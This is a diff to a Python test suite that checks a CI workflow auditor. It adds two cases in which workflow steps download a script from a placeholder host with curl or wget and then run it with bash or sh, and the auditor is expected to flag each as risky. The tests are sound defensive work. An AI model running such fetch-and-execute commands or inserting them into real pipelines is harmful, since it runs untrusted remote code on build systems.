@@ -165,6 +165,20 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_combined_curl_output_option_then_bash_rejected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSLo payload.sh https://example.invalid/i && bash payload.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_long_output_document_then_sh_rejected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget --output-document=local.sh https://example.invalid/i && sh local.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
     def test_curl_download_to_file_without_execute_remains_unflagged(self):
         self.write(
             "jobs:\n  x:\n    steps:\n"
